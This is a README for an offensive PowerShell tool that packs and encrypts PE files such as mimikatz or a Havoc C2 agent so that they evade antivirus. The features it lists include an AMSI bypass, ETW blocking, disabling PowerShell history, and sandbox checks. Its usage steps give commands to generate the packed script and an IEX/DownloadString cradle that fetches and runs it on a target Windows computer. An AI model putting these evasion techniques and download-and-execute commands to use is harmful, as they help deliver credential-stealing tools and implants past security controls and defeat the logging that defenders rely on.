### Invoke-PoSH-PePacker.ps1
--------------------------------------
'Invoke-PoSH-PePacker' allows to pack and encrypt offensive PE files in order to bypass AV solutions such as Windows Defender.  
It generates an obfuscated and encrypted PowerShell script that contains the PE file that you want to pack.

#### FEATURES
  - AES encryption and GZip/Deflate compression (based on 'Xencrypt')
  - Reflective PE injection (based on an updated version of 'Invoke-ReflectivePEInjection')
  - AMSI bypass (pseudo random)
  - Blocking Event Tracing for Windows (ETW)
  - Disabling PowerShell history logging
  - Basic sandbox evasion techniques (optional)
    - stop/exit if the PowerShell script is not run on a domain-joined Windows computer 
    - stop/exit if the PowerShell session is being debugged (detection based on "Test-Path Variable:PSDebugContext")
    - wait for 60 seconds before execution
  
#### USAGE
  - Step 1. Generate an obfuscated & encrypted PowerShell script that contains your PE file (e.g. mimikatz.exe, havocdemon.exe) stored locally or on a remote web server.
```
PS C:\> Import-Module ./Invoke-PoSH-PePacker.ps1
PS C:\> Invoke-PoSH-PePacker -FilePath C:\path\PE-file.exe -OutFile C:\path\Packed-PE-file.ps1
--- or ---
PS C:\> Invoke-PoSH-PePacker -FilePath C:\path\PE-file.exe -OutFile C:\path\Packed-PE-file.ps1 -sandbox
``` 
```
PS C:\> Import-Module ./Invoke-PoSH-PePacker.ps1
PS C:\> Invoke-PoSH-PePacker -FileUrl https://URL/PE-file.exe -OutFile C:\path\Packed-PE-file.ps1 
--- or ---
PS C:\> Invoke-PoSH-PePacker -FileUrl https://URL/PE-file.exe -OutFile C:\path\Packed-PE-file.ps1 -sandbox
```
  - Step 2. Download & execute the obfuscated & encrypted PowerShell script (that contains your PE file) on a target Windows computer
```
PS C:\> IEX (New-Object Net.WebClient).DownloadString('https://URL/Packed-PE-file.ps1'); Execute-PE
--- or ---
PS C:\> IEX (New-Object Net.WebClient).DownloadString('https://URL/Packed-PE-file.ps1'); Execute-PE argument1 argument2 ...
--- or (not recommended) ---
PS C:\> WGET -URI https://URL/Packed-PE-file.ps1 -OutFile C:\temp\Packed-PE-file.ps1
PS C:\> Import-Module C:\temp\Packed-PE-file.ps1
PS C:\> Execute-PE
        or 
PS C:\> Execute-PE argument1 argument2 ...
``` 

#### LICENSE
  - GNU General Public License v3.0
